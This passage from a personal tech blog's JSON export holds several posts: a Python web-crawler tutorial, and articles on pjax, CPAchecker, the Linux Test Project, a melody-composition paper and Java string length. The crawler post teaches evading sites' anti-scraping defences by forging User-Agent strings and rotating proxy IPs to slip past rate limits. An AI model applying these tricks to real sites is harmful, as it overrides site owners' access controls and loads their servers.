进入我的首页www.meng.uno，打开浏览器的“检查”功能，选项卡选到“Network”，然后点击所有文章，随便选择一条，我们可以发现如下截图的&quot;Headers&quot; 我们可以发现最明显的有两个区域（我已经圈出来了）：“request”和“response”。从字面意思上来看，我们就知道分别是（发送的）请求和（收到的）回复。 接收的信息是我们请求的网页给的，不用我们管，但是“请求的网页”是我们需要提前设定的，当然最简单的方式就是什么都不设置。爬虫会增加网站的负荷，所以很多网站希望大家通过API的方式使用其开放的资源而禁止爬虫，其中的一个做法就是判断你的请求内容（不全的基本都是爬虫）。于是，为了做到一个完整的可用的爬虫，我们需要模拟真实用户的请求，这就要求我们伪造“User Agent”。 常见的“User Agent”列举如下： Android Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19 Mozilla/5.0 (Linux; U; Android 4.0.4; en-gb; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mozilla/5.0 (Linux; U; Android 2.2; en-gb; GT-P1000 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 Firefox Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0 Mozilla/5.0 (Android; Mobile; rv:14.0) Gecko/14.0 Firefox/14.0 Google Chrome Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36 Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19 iOS Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3 Mozilla/5.0 (iPod; U; CPU like Mac OS X; en) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/3A101a Safari/419.3 User Agent已经设置好了，但是还应该考虑一个问题，程序的运行速度是很快的，如果我们利用一个爬虫程序在网站爬取东西，一个固定IP的访问频率就会很高，这不符合人为操作的标准，因为人操作不可能在几ms内，进行如此频繁的访问。所以一些网站会设置一个IP访问频率的阈值，如果一个IP访问频率超过这个阈值，说明这个不是人在访问，而是一个爬虫程序。 一个很简单的解决办法就是设置延时，但是这显然不符合爬虫快速爬取信息的目的，所以另一种更好的方法就是使用IP代理。使用代理的步骤： 调用urlib.request.ProxyHandler()，proxies参数为一个字典； 创建Opener(类似于urlopen，这个代开方式是我们自己定制的)； 安装Opener； 这个网站提供了很多代理主机：http://www.xicidaili.com/ 正则表达式 我直接以表格的形式呈现好了： 元字符 说明 . 代表任意字符 [ ] 匹配内部的任一字符或子表达式 [^] 对字符集和取非 - 定义一个区间 \\ 对下一字符取非（通常是普通变特殊，特殊变普通） * 匹配前面的字符或者子表达式0次或多次 *? 惰性匹配上一个 + 匹配前一个字符或子表达式一次或多次 +? 惰性匹配上一个 ? 匹配前一个字符或子表达式0次或1次重复 {n} 匹配前一个字符或子表达式 {m,n} 匹配前一个字符或子表达式至少m次至多n次 {n,} 匹配前一个字符或者子表达式至少n次 {n,}? 前一个的惰性匹配 ^ 匹配字符串的开头 \\A 匹配字符串开头 $ 匹配字符串结束 [\\b] 退格字符 \\c 匹配一个控制字符 \\d 匹配任意数字 \\D 匹配数字以外的字符 \\t 匹配制表符 \\w 匹配任意数字字母下划线 \\W 不匹配数字字母下划线 代码 简单带错误信息的获取网页内所有URL的爬虫 1234567891011121314151617181920212223242526272829303132333435363738 #获取URL的包import urllib#获取字符集编码方式import chardet#正则表达式import re#Request 对象req = urllib.request.Request(\"http://meng.uno/\")data = Nonetry: #得到Response response = urllib.request.urlopen(req,data) #读出response == 请求文件的全部字符 html = response.read() #获取这个response的编码方式 charset = chardet.detect(html) print(\"编码方式：\",charset) #以这种编码方式解码打印 html = html.decode(charset.get(\"encoding\")) print(html) urls = re.findall('href=\\\"https*://w*\\.*meng\\.uno/.*?\\\"', html,re.S) uris = re.findall('href=\\\"/[^/].*?[^\\.]\\\"',html, re.S) for item in urls: print(item[6:-1]) for item in uris: if \".html\" in item: print(\"http://www.meng.uno\"+item[6:-1]) elif '.' in item: continue else: print(\"http://www.meng.uno\"+item[6:-1])except urllib.error.HTTPError as e: if hasattr(e, 'code'): print(\"HTTPError\") print(e.code) elif hasattr(e, 'reason'): print(\"URLError\") print(e.reason) 模拟真实环境的爬虫 12345678910111213141516171819 import urllib #访问网址url = 'http://www.whatismyip.com.tw/'#这是代理IPproxy = &#123;'https':'110.73.48.189:8123'&#125;#创建ProxyHandlerproxy_support = urllib.request.ProxyHandler(proxy)#创建Openeropener = urllib.request.build_opener(proxy_support)#添加User Angentopener.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36')]#安装OPenerurllib.request.install_opener(opener)#使用自己安装好的Openerresponse = urllib.request.urlopen(url)#读取相应信息并解码html = response.read().decode(\"utf-8\")#打印信息print(html) 通过队列获取网站所有URL的爬虫 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950 #python系统关于队列的包import queue#获取URL的包import urllib#获取字符集编码方式import chardet#正则表达式import reinitial_page = \"http://www.meng.uno\"url_queue = queue.Queue()seen = set()seen.add(initial_page)url_queue.put(initial_page)def extract_urls(url): req = urllib.request.Request(url) #得到Response response = urllib.request.urlopen(req) #读出response == 请求文件的全部字符 html = response.read() #获取这个response的编码方式 charset = chardet.detect(html) #以这种编码方式解码打印 html = html.decode(charset.get(\"encoding\")) urls = re.findall('href=\\\"https*://w*\\.*meng\\.uno/.*?\\\"', html,re.S) uris = re.findall('href=\\\"/[^/].*?[^\\.]\\\"',html, re.S) tempseen = set() for item in urls: tempseen.add(item[6:-1]) for item in uris: if \".html\" in item: tempseen.add(\"http://www.meng.uno\"+item[6:-1]) elif '.' in item: continue else: tempseen.add(\"http://www.meng.uno\"+item[6:-1]) return tempseen while(True): #一直进行直到海枯石烂 if url_queue.qsize()&gt;0: current_url = url_queue.get() #拿出队例中第一个的url print(current_url) #把这个url代表的网页存储好 for next_url in extract_urls(current_url): #提取把这个url里链向的url if next_url not in seen: seen.add(next_url) url_queue.put(next_url) else: break 这里先简单解释，以后有实际项目会再补充！ 本文链接： http://www.meng.uno/articles/51d32f19/ 欢迎转载！","categories":[{"name":"Python","slug":"Python","permalink":"http://www.meng.uno/categories/Python/"},{"name":"爬虫","slug":"Python/爬虫","permalink":"http://www.meng.uno/categories/Python/爬虫/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://www.meng.uno/tags/Python/"},{"name":"爬虫","slug":"爬虫","permalink":"http://www.meng.uno/tags/爬虫/"}]},{"title":"pjax: 当ajax遇上pushState","slug":"pjax","date":"2018-02-12T00:55:00.000Z","updated":"2018-03-20T06:59:57.926Z","comments":true,"path":"articles/c039b062/","link":"","permalink":"http://www.meng.uno/articles/c039b062/","excerpt":"var pjax = pushState + ajax; 小时候，小浣熊方便面里面有各种水浒人物的卡片。我买了一包，吃了方便面，饱了。而我又买了第二包，不是想吃方便面，而是仅仅想得到里面的卡片… 一、简介 pushState是html5中提供的方法，用以 * 无刷新的更新浏览器地址栏； * 如其名称，将新地址push到历史堆栈中 用法：pushState(data, title ,url) data为保存的对象，可以在window.onpopstate时获取到；title为页面标题；url为需地址栏和历史发生改变的url。 正是这点看似很平常的功能，跟ajax结合到一起产生了火花","text":"var pjax = pushState + ajax; 小时候，小浣熊方便面里面有各种水浒人物的卡片。我买了一包，吃了方便面，饱了。而我又买了第二包，不是想吃方便面，而是仅仅想得到里面的卡片… 一、简介 pushState是html5中提供的方法，用以 无刷新的更新浏览器地址栏； 如其名称，将新地址push到历史堆栈中 用法：pushState(data, title ,url) data为保存的对象，可以在window.onpopstate时获取到；title为页面标题；url为需地址栏和历史发生改变的url。 正是这点看似很平常的功能，跟ajax结合到一起产生了火花。因为，ajax最擅长的事情就是局部刷新页面。 二、ajax的纠结历史 一切可以从ajax最擅长的事情说起。 ajax作为一个异步请求模型，从最初设计开始，也许压根就没打算将它跟浏览器历史挂钩。原因是历史堆栈所记录的，某种意思上可以说是顺序，跟我们理解的“同步”更为密切。 因而，ajax可以无刷新改变页面内容，却无法改变页面的url。 历史问题1 - 如何操控历史 当单页面越来越流行，操作记录却很容易被忽略。假设有这样的单页面，按照分类点击，界面逐层递进：体育 - 篮球 -nba -马刺队 - 邓肯 当我们点了4下到“邓肯”界面时，一个不小心的刷新，出现在你面前的也许是“体育”。原因是操作记录没有被记录。 而通常的解决方案是修改hash，每递进一层，去更新url的hash值，这样的方法： 刷新时预先判断url的hash，从而知道这是哪一层，加载相应数据； 支持了历史 这样的方式貌似比较完善，其实不然。 历史问题2 - 对搜索引擎不友好 最大的问题是，hash后生成的内容是不会被搜索引擎引用到。数据不能被爬取，无疑是浪费和损失。因此google放言，咱可以约定个协议：#!xxx这样hash的url，google也去爬取。称之为hash bang（哈希大爆炸？）。这一协议，在g+，twitter，人人，新浪微博上都可以看到。 事实上，ajax最或缺的两个问题，恰好被pushState的功能补充完善。 三、pjax带来的价值 除去补齐了ajax的问题，我们发现pjax会给web带来更多的好处。 回到开始说的“两包方便面”，我的意思是，有时你访问两个url，部分数据是相同的。比如百度贴吧，第一页和第二页的区别只是帖子内容（卡片）的不同，网站外框部分（方便面）都是一样的，这些东西就不需要在页面刷新时重复加载。 ajax处理这样的局部刷新，已经给我们带来了web2.0的体验，而加上pushstate的ajax则更进一步： 一个url对应一套数据，有利于SEO； 更改数据和url时，只是局部刷新，带来较好的用户体验； 兼容性好，对不支持pushstate的浏览器，url也能正常请求页面（虽然有重复加载）； 刷新页面时，由于是url唯一，能正常加载到用户希望看到的数据，比处理hash的方式更方便； 后退与前进的浏览器操作，依然可以局部刷新（通过onpushstate事件捕获） 四、注意事项 然而pjax不等于单纯的分离使用pushstate与ajax，还必须得做一些封装。缘于以下我能想到的注意事项： 服务器端增加额外处理逻辑 服务器端，需要根据请求的参数，作出全页渲染或局部渲染响应 1234567 Accept:text/html, */*; q=0.01Accept-Encoding:gzip,deflate,sdchConnection:keep-aliveHost:qianduannotes.duapp.comUser-Agent:AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36X-Requested-With:XMLHttpRequestX-PJAX:true 比如请求头部可以设定一个X-PAJX:true，用以通知服务器。 浏览器兼容 假如浏览器不支持pushstate，提供fallback操作，直接打开需更改url的地址： 12345678 $.support.pjax = window.history &amp;&amp; window.history.pushState// Fallbackif ( !$.support.pjax ) &#123; $.pjax = function( options ) &#123; window.location = $.isFunction(options.url) ? options.url() : options.url &#125; $.fn.pjax = function() &#123; return this &#125;&#125; 本地存储机制 无疑pjax与localstorage共同使用可以进一步提升体验，但这一步容易忽略的是数据上报。 五、参考资料 jquery-pjax welefen封装的pjax 本文链接： http://www.meng.uno/articles/c039b062/ 欢迎转载！","categories":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/categories/web/"}],"tags":[{"name":"ajax","slug":"ajax","permalink":"http://www.meng.uno/tags/ajax/"},{"name":"js","slug":"js","permalink":"http://www.meng.uno/tags/js/"},{"name":"html5","slug":"html5","permalink":"http://www.meng.uno/tags/html5/"},{"name":"pjax","slug":"pjax","permalink":"http://www.meng.uno/tags/pjax/"},{"name":"pushState","slug":"pushState","permalink":"http://www.meng.uno/tags/pushState/"}]},{"title":"CPAchecker","slug":"cpachecker","date":"2018-02-11T14:08:59.000Z","updated":"2018-02-11T14:15:48.025Z","comments":true,"path":"articles/c5d9877c/","link":"","permalink":"http://www.meng.uno/articles/c5d9877c/","excerpt":"CPAchecker is a tool for configurable software verification which means expressing different program analysis and model checking approaches in one single formalism. The main algorithm is configurable to perform a reachability analysis on arbitrary combinations of existing configurable program analys","text":"CPAchecker is a tool for configurable software verification which means expressing different program analysis and model checking approaches in one single formalism. The main algorithm is configurable to perform a reachability analysis on arbitrary combinations of existing configurable program analysis (CPA). One application of CPAchecker is the verification of Linux device drivers. CPA provides a conceptual basis for expressing different verification approaches in the same formal setting. The CPA formalism provides an interface for the definition of program analyses, which includes the abstract domain, the post operator, the merge operator, and the stop operator. Consequently, the corresponding tool implementation CPAchecker provides an implementation framework that allows the seamless integration of program analyses that are expressed in the CPA framework. The comparison of different approaches in the same experimental setting becomes easy and the experimental results will be more meaningful. Architecture The above picture is the overview of CPAchecker’s architecture. The central data structure is a set of control-flow automata (CFA), which consist of control-flow locations and control-flow edges. A location represents a program-counter value, and an edge represents a program operation, which is either an assume operation, an assignment block, a function call, or a function return. Before a program analysis starts, the input program is transformed into a syntax tree, and further into CFAs. The framework provides interfaces to SMT solvers and interpolation procedures, such that the CPA operators can be written in a concise and convenient way. From the picture, we know that they use MathSAT as an SMT solver, and CSIsat and MathSAT as interpolation procedures. They also use JavaBDD as a BDD package, and provide an interface to an Octagon Library as well. The CPA Algorithm is the center of this project and the detailed design is shown as follows. The CPA algorithm (shown at the top in the above figure) takes as input a set of control-flow automata (CFA) representing the program, and a CPA, which is in most cases a Composite CPA. The interfaces correspond one-to-one to the formal framework. The elements in the gray box (top right) represent the abstract interfaces of the CPA and the CPA operations. The two gray boxes at the bottom of the figure show two implementations of the interface CPA, one is a Composite CPA that can combine several other CPAs, and the other is a Leaf CPA. Build and Test Owing to the long development history, this project is very prefect which means you could use its binary directly, build from the source and even use their jar-ball in Java applications. To experience it, I will build it from the source and use it in the command-line. We need to install “jdk”, “ant”, “svn” and “subversion” before we build it. Then enter the root directory and run “ant”. Wait a moment and this is the result. To test this project, we need to write a C/C++ code without “#include ”. I choose a simple one (QuickSort) shown in the attachment. The result contains a log file, a statistics file and a report which is in “html” format. 本文链接： http://www.meng.uno/articles/c5d9877c/ 欢迎转载！","categories":[{"name":"Software Verification","slug":"Software-Verification","permalink":"http://www.meng.uno/categories/Software-Verification/"},{"name":"CPA","slug":"Software-Verification/CPA","permalink":"http://www.meng.uno/categories/Software-Verification/CPA/"},{"name":"CPAchecker","slug":"Software-Verification/CPA/CPAchecker","permalink":"http://www.meng.uno/categories/Software-Verification/CPA/CPAchecker/"}],"tags":[{"name":"CPA","slug":"CPA","permalink":"http://www.meng.uno/tags/CPA/"},{"name":"CPAchecker","slug":"CPAchecker","permalink":"http://www.meng.uno/tags/CPAchecker/"}]},{"title":"Linux Test Project","slug":"ltp","date":"2018-02-11T13:29:33.000Z","updated":"2018-02-11T14:04:49.151Z","comments":true,"path":"articles/bfb74f68/","link":"","permalink":"http://www.meng.uno/articles/bfb74f68/","excerpt":"I found this project from the references of other papers, and I thought it was good, so I plan to run it. As we can see from its name, Linux Test Project (LTP) has a goal to deliver test suites to the open source community that validate the reliability, robustness, and stability of Linux. This proje","text":"I found this project from the references of other papers, and I thought it was good, so I plan to run it. As we can see from its name, Linux Test Project (LTP) has a goal to deliver test suites to the open source community that validate the reliability, robustness, and stability of Linux. This project wants to support Linux development by making unit testing more complete and minimizing user impact by building a barrier to keep bugs from making it to the user. There are two important testing techniques which are supported by giving developers an ever growing set of tools to help identify any operational problems in their code: Design and Code Inspections. I knew that Yggdrasil and Hyperkernel which I have run successfully belong to the last category. LTP doesn’t have a benchmark which means they don’t compare different kernel of Linux. In LTP, we need to know: Test case: A single action and verification which has a result PASS/FAIL. Test suite: Containing one or more test cases. Test tags: Pairing a unique identifier with a test program and a set of command line options. We also need to know the ways of reporting the results of a test case. There are two main ways which are contained in LTP: Exit status: If a test program encounters unexpected or incorrect results, exit the test program with a non-zero exit status, i.e. exit(1). Conversely, if a program completes as expected, return a zero exit status, i.e. exit(0). Standard output: Tools can be used to analyze the results, if they are written in a standard way. Build and Run To build this project, we need to run the following executions: 123456 $ git clone https://github.com/linux-test-project/ltp.git$ cd ltp$ make autotools$ ./configure$ make$ make install Before these, we need to ensure “git, autoconf, automake, m4” are installed. If not, we can use “apt-get” to get them. The output of “make” is shown as following. After building this project, let’s run it personally. If we want to run all the test suites, we just need run “./runltp” in the “opt/ltp/” directory. However, I will run a single test suite to verify this project only with “./runltp -f syscalls” execution. The picture above is the output of “abort01” test case. From it we can see that the test method is “Exit status test” and it passes all the situations. If a test case needs datafiles to work, these would be put in a subdirectory named datafilesand installed in the testcases/data/$TCID directory Analyze Test Cases We could find LTP in “/opt/ltp” and the test suites are installed in the “/opt/ltp/runtest/” directory. The following picture is a screenshot of it. In a single file, such as “syscalls” file, there exist many single test cases which are like the follows. From this picture, those words, like “abort01”, represent different test cases which are laid in “/opt/ltp/testcases/bin/” directory. Each test case is a binary written either in portable Shell or C such as “abort01” which is from “abort01.c” which lays in the “ltp/testcases/kernel/syscalls/abort” directory. The test gets a configuration via environment variables and/or command line parameters, it prints additional information into the stdout and reports overall success/failure via the exit value. Write A Test Suite To make things simple, I will use LTP standard interface, not add custom reporting functions and use LTP build system. The following are my steps (These steps are very simple, so I didn’t list any screenshot): Add a new file “meng” to “ltp/runtest/” directory; Write some test cases’ names, such as “abort01 accept01”; Run “make” and “make install”; Enter “/opt/ltp/” directory; Run “./runltp -f meng”; Get the result as the picture. (You can also find the full logs from “meng_output.txt” file in the attachment) Write A Test Case As I said before, we can use C language or Shell to write a test case, however, in this section, I will just use C language to write a simple one which may make me have a deep understanding of this project. I used the “man-pages” to find the untested system calls, however, my linux version maybe a little old (2015 release, version 16.04), so that I can’t find a untested one which is excluded by the newest LTP. I will write a test for verifying system call “file rename”. First, I create a new file “meng.c” in the “ltp/testcases/kernel/syscalls/meng/” directory. Then I need to write the codes. The next thing I need to do is to include “tst_test.h” (There are also another headers, however, this one is basic). We need to write “main(), setup(), clean()” functions and the detailed realizations are in the “meng.c” which is in the attachment (I give some notes of the code in the “meng.c” file as well). What’s more, we need to create a “Makefile” in the same directory and write the compiling information. The compiled file is like this. Last, I will add this test case to the “meng” test suite and see the result (You can find the full output in “meng_syscall_output.txt” in the attachment). From the above picture, we can see that the verification is “pass” which means that not only the “rename” system call is correct, but also my code is right. 本文链接： http://www.meng.uno/articles/bfb74f68/ 欢迎转载！","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.meng.uno/categories/Linux/"},{"name":"Linux Test","slug":"Linux/Linux-Test","permalink":"http://www.meng.uno/categories/Linux/Linux-Test/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.meng.uno/tags/Linux/"},{"name":"Linux Test","slug":"Linux-Test","permalink":"http://www.meng.uno/tags/Linux-Test/"}]},{"title":"A Melody Composer for both Tonal and Non-Tonal Languages","slug":"paperreport-hkust-dm","date":"2018-02-11T04:03:24.000Z","updated":"2018-03-02T03:27:32.829Z","comments":true,"path":"articles/2251dcee/","link":"","permalink":"http://www.meng.uno/articles/2251dcee/","excerpt":"Summary Abstract This paper contains some improvements on an algorithmic melody composer called “T-music”. “T-music” is an algorithm which can compose a melody for users’ input lyrics by mining the relationship between the melodies and lyrics. These relationships are known as frequent patterns (FPS)","text":"Summary Abstract This paper contains some improvements on an algorithmic melody composer called “T-music”. “T-music” is an algorithm which can compose a melody for users’ input lyrics by mining the relationship between the melodies and lyrics. These relationships are known as frequent patterns (FPS) . The ameliorations are two ways to enhance the methods of mining frequent patterns form instrumental compositions and an optimal way of using FPS mined from songs in one language to compose a melody for the input things in another language. Propse The propose is to get an algorithm which take lyrics as input and a good melody as outcome in order to help those people who have little music background to compose songs. In view of the fact that there is already a pretty well method, T-music, the authors’ tasks are making some improvements on the basis of the original algorithm. Deficiencies of original algorithm At the first place, I need to borrow a figure from the paper as follows to express my understanding of the original T-music method. As the picture shows that the system architecture of T-music can be divided as two phases which are “Frequent Pattern Mining” and “Melody Composition”. I will report this method following the flow of the algorithm. Mining the FPS from “Song Database” and storing them in the “Frequent Pattern Database”: Obtaining tone sequences from “Song Database” by reading the “Language Dictionary”; Generating s-sequence from a melody, a pitch sequence and a duration sequence; Mining the FPS from s-sequence; Storing the FPS to “Frequent Pattern Database”. Composing a melody for the “Lyrics” based on FPS in the “Frequent Pattern Database”: Obtaining the tone sequence of the lyrics by reading the “Language Dictionary”; Adding some “Music Parameters” such as some music rules; Generating “Melody” by the process “Melody Composition” using FPS. There are some deficiencies of the original T-music algorithm as follows. It can only mine FPS from songs in which lyrics must be present. What’s more, the original one can’t use the FPS mined from a language to compose melody in another language. However, we can’t always get the ideal songs data which have lyrics embedded easily. What we can get from the Internet are those instrumental compositions in which lyrics are absent. Also, we want to achieve that composing melody in a language with the FPS mined from another language which can make the algorithm more efficient. Improvements What the authors have done provided two ways to mine Frequent Patterns from instrumental compositions and an optimal mapping method for composing a melody using FPS in different language with the input lyrics. The first way is “Method emphasizing the original FPS”. I will use the following picture to express my comprehension. Firstly, mining the FPS from songs and storing them in “FP database (General)”. Secondly, mining the frequent pitch trends from “Instrumental compositions with style database” and storing them in “Frequent pitch trends (Style)” and then using it as a selector to select those FPS storing the matches in “FP database (Style)”. The second way is “Method emphasizing the newly mined frequent pitch trends”. I will also introduce it using the screenshot from the paper. The FPS based on those of the first way was subdivided. The frequent pitch trends are mined as usually. The most difference is that one pitch trend may match a set of several tone trends. The optimal mapping method is shown as follows. Firstly, using the same method gets a “FP database” in one language. Then, generating several tone sequences for each tone trend in this “FP database”. There are some lemmas proofed on the paper to decide the specific number of the mapping. Improvements In this section, I will analysis some excellent algorithms, important thoughts or some key points. Some of them may look small or nothing special, but each has its function. Using the “Trend” representation If I were doing this job, I could have chosen the simple “absolute” representation, just because this is the most intuitive frequent pattern we can get from songs. After careful consideration, just as the author explains that same melodies which start at different pitches may sound similar to us. Then, I understand that it is a big wisdom to use the “trend” representation which uses a FP to extract the general rules of a set of FPS with different pitches, simplifying a large number of calculations and making the result more obvious. Using “Frequent pitch trends (Style)” as a selector Though we know that “T-music” uses “the FPS between the tone port and the pitch part” and agree the mining method used on mining the frequent pattern which contains a tone trend and a pitch trend, there must be some correlation between “Tone trend” and “Pitch trend”. Since the instrumental compositions don’t contain lyrics, we couldn’t mine a whole frequent pattern from them. However, we can also mine part of the frequent pattern from them which is “Pitch trend”. For we have so much instrumental compositions which means we can get enough “Pitch trend” and we already know the correlation between “Tone trend” and “Pitch trend”, we can estimate the frequency of the original frequent pattern and eliminate part of them which have a zero frequency. Using the subsequences of original frequent pattern According to the Apriori property that all nonempty subsets of frequent item set must also be frequent, the authors artfully break the original FPS into smaller form and then making them combine more FPS which can be selected from the original FP database. By doing this, we can get more frequent patterns from the identical data which means our mining algorithm is more efficient. Using multi-map as a data structure This data structure allows the task of retrieving a value by a key quickly and returns more than one frequent pattern with a support. From it, we can get a tuple in top-k tuples with some selection strategies and ensure that a pattern with a very large support isn’t always selected because it doesn’t mean that it is always the best choice. Employing the divide and conquer idea Considering to compose a melody of a very long lyric, we may need to divide the original tone trend into several shorter tone trends, apply the same procedure on them and then return the concatenation of the results of the sub-problems. It is a simple idea of solving such problem, but we can’t resist its correctness and effectiveness. Limitations I just list some areas that I think need improvements or I think it can be added slightly on the basis of the original research. Applying word segmentation Though the paper has mentioned the use of word segmentation, there is just a word and no detailed explanation. I think I should express my own idea here. Firstly, the word segmentation here isn’t the same of those applied in the fields of natural language processing (NLP). As we all known, the latter has so many strict norms to follow, however, in the lyrics, the norms aren’t very same. Why we do this in the input lyrics is because we want to determine the length of durations between every two words, which is different from the propose in the NLP which just wants to add pause at the same length of time between words and words. Handling the tone trend with a length of 1 In this paper, the authors just simply set the pitch trend to be the input tone trend where, I think, may need improvement. Firstly, we all know that “the tone trend with a length of 1” couldn’t appear individually. It is usually because we matched the tone sequences before it or after it. I think if we consider dividing the original sequence into overlapping parts using the similar idea of divide and conquer idea, the question may disappear. Mining the relationship between “tone trend” and “pitch trend” The authors just determine the relationship based on statistics in whether the original T-music method or the improved edition, store the regulars on a multi-map and when using the frequent pattern, the method just randomly selects a tuple from top-k tuples from the multi-map. Therefore, no matter which one we choose, it is just the original sequence in the FP-database. If there is a very large database which contains a large number of every frequent pattern, it may have a remarkable effect without complex computations. However, we can’t ensure it or we just want to improve our algorithm with little support of so many records. Let’s look at the following samples which has the form as same as those in the multi-map and assume that the same tone trend only has the three tuples. 123 &lt;1,1,2,2,1,0&gt; —&gt; (&lt;1,1,2,0,-1,-2&gt;, 10)&lt;1,1,2,2,1,0&gt; —&gt; (&lt;1,1,2,0,-2,-1&gt;, 9) &lt;1,1,2,2,1,0&gt; —&gt; (&lt;1,0,2,0,-2,-1&gt;, 5) As we can see, they have the same tone trend and different pitch trends with different values of a support. If we just use the method described in the paper, we may get the result of the 1st, the 2nd, or the 3rd. However, is it the best one? Maybe not, I think. I mean maybe &lt;1,1,2,0,-2,-1&gt; is better. I think we need to add some correlation analyses to the pitch trends which have the same tone trends. Expanding Research After reading this paper, I have some ideas for further research and some of them are listed as follows. Adding location variables I mean, as we all known, a same lyric may have different melodies when it is at the beginning or at the end of a song. Of course, if we just want to use a simple sentence as its input, this consideration is rather superfluous. However, if the input lyric is long enough, it is very important then. Generating a melody with a longer note This thought is mentioned in the end of the paper as well. We may have noticed that the normal notes will be longer than the syllables of lyrics, at least at the end of each sentence. We may need to modify the match method to add the frequent pattern which contains group of pitch trends sequences and its corresponding longer tone trends sequences. Applying syntactic analysis The following is my exploratory opinion of the original T-music. If I have many songs with lyrics, I will mine the frequent patterns of syntactic analysis and add them to the “s-sequence” mentioned in this paper. Thus I will reform the original multi-map as follows. 1 (&lt;pitch trend pattern&gt;, &lt;syntax pattern&gt;) —&gt; (&lt;tone trend pattern&gt;, support) When we match the input lyrics, we need to not only match the “pitch trend pattern” from the FP-database but also contrast the “syntax pattern” and then make the best decision. Expanding to speech recognization I have a simple idea of speech recognization using the same method mentioned in this paper. If I could collect enough voice information spoken by the same person, I would mine the frequent patterns of his intonation habit from the voice data and then using them to judge whether another voice is his or not. Expanding to password security In order to prevent the password being stolen, all websites are making efforts on password diversity. I think the method of mining frequent pattern can be applied to protect users’ password as well. For the same string of ciphers, different people may type it out in different speeds with different intermission on every two letters. I, for example, usually use the combination of my name and birthday as a password and when I type it out there is a longer break between the last letter of my name and the first number of my birthday. If we use the same way to mine the frequent patterns form enough times records of someone, we may use the frequent patterns to judge whether it is the right person or not who is typing the password. Generating “good problems” I often encounter some tricky programming problems and as we all known, “StackOverflow” is the biggest website which can offer you relevant solutions when you ask a question on it. However, we all want to get the best answer as soon as possible so we may need to put forward “good questions”. I think the thought of this paper can be applied to this question. We can first collect enough “good questions” from the website and then mine the syntactic frequent patterns of each question by categories. Finally, we can generate such “good questions” by adding the knowledge of sentence construction and providing some keywords needed. Related Research This paper is about mining frequent patterns which is a subfield of data mining. I will express my understanding mixing information retrieved from the Internet in this field. With the rise of big data, so many research topics about data is more and more frequent such as forecasting passenger flow and passenger flow directions during the Spring Festival and predicting the composition of Chinese college entrance examination this year. Data mining means the process of extracting valuable information and patterns from large amounts of data and these new discovery rules, patterns, information and concepts have potential value. It usually contains the association rules, classification, estimation, clustering and so on. As for association analysis, its propose is to discover interesting links hidden in large data sets and the patterns discovered are usually represented in association rules or frequent item sets just as this paper shown. There are several efficient and scalable frequent item set mining methods such as Apriori algorithm and FP-growth which needs to construct FP-tree. As for classification and prediction, I think it is a more stirring area. Think of this, a marketing manager needs data analysis to help guess whether or not a customer with a given profile will buy a new computer and then the marketing manager would like to predict how much a given customer will spend during a sale, what an attractive job! 本文链接： http://www.meng.uno/articles/2251dcee/ 欢迎转载！","categories":[{"name":"Paper Report","slug":"Paper-Report","permalink":"http://www.meng.uno/categories/Paper-Report/"},{"name":"Data mining","slug":"Paper-Report/Data-mining","permalink":"http://www.meng.uno/categories/Paper-Report/Data-mining/"}],"tags":[{"name":"Paper Report","slug":"Paper-Report","permalink":"http://www.meng.uno/tags/Paper-Report/"},{"name":"Data Mining","slug":"Data-Mining","permalink":"http://www.meng.uno/tags/Data-Mining/"}]},{"title":".length与length()的区别","slug":"2length","date":"2018-02-10T13:58:04.000Z","updated":"2018-02-10T14:52:50.489Z","comments":true,"path":"articles/61c2f1f1/","link":"","permalink":"http://www.meng.uno/articles/61c2f1f1/","excerpt":"当我们需要使用数组或者字符串长度时，习惯了使用IDE自动补全的我们是否知道.length与length()的区别喻原因呢？ 上面问题的答案是： * 数组使用.length属性 * 字符串使用length()方法 下面我来回答原因。 为什么数组有.length属性？ 在Java中，数组是容器对象，其中包含了固定数量的同一类型的值，一旦数组创建，其长度就是固定的了，于是，其长度可以作为一个属性。 为什么字符串需要length()方法？ Java中的String，实际上是一个char类型数组，而char[]已经有了.length属性，所以在实现String时就没必要再定义重复的属性了，","text":"当我们需要使用数组或者字符串长度时，习惯了使用IDE自动补全的我们是否知道.length与length()的区别喻原因呢？ 上面问题的答案是： 数组使用.length属性 字符串使用length()方法 下面我来回答原因。 为什么数组有.length属性？ 在Java中，数组是容器对象，其中包含了固定数量的同一类型的值，一旦数组创建，其长度就是固定的了，于是，其长度可以作为一个属性。 为什么字符串需要length()方法？ Java中的String，实际上是一个char类型数组，而char[]已经有了.length属性，所以在实现String时就没必要再定义重复的属性了，于是需要定义一个方法来返回其长度。 本文链接： http://www.meng.uno/articles/61c2f1f1/ 